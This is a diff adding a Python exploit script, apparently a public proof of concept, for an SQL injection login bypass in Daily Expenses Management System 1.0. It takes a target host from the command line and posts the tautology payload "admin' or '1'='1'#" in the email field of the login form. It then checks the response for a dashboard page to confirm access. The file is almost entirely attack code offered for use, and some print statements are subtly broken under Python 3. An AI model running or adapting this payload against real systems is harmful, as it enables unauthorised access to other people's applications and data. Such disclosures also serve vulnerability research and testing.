@@ -1,0 +1,47 @@
+# Exploit Title: Daily Expenses Management System 1.0 - 'username' SQL Injection
+# Exploit Author: Daniel Ortiz
+# Date: 2020-08-01
+# Vendor Homepage: https://www.sourcecodester.com/php/14372/daily-tracker-system-phpmysql.html
+# Tested on: XAMPP Version 5.6.40 / Windows 10
+# Software Link:  https://www.sourcecodester.com/php/14372/daily-tracker-system-phpmysql.html
+
+import sys
+import requests
+import urllib3
+import re
+import time
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)
+
+def make_request(url, payload):
+    
+    p = {"http":"127.0.0.1:8080", "https": "127.0.0.1:8080"}
+    s = requests.Session()
+    r = s.post(url, data=payload, proxies=p)
+    return r
+
+if __name__ == '__main__':
+
+    if len(sys.argv) != 2:
+        print("[*] Daily Expenses Management System | username SQL injection")
+        print("[*] usage: %s  TARGET" % sys.argv[0])
+        print("[*] e.g: %s  192.168.0.10" % sys.argv[0]) 
+        sys.exit(-1)
+
+    TARGET = sys.argv[1]
+    LOGIN_FORM = "http://%s/dets/" % TARGET
+    
+    
+    # Step 1 - Bypass login form
+
+    url = LOGIN_FORM
+    p1 = {'email': "admin' or '1'='1'#", 'password': 'admin', 'login': 'login'} 
+    r = make_request(url, p1)
+    print("[+] Endpoint: %s") % LOGIN_FORM
+    print("[+] Making requests with payload: %s") % p1
+
+    if re.findall('Dashboard', r.text):
+        print("[+] Target vulnerable")
+    else:
+        print("[-] Error !!!")
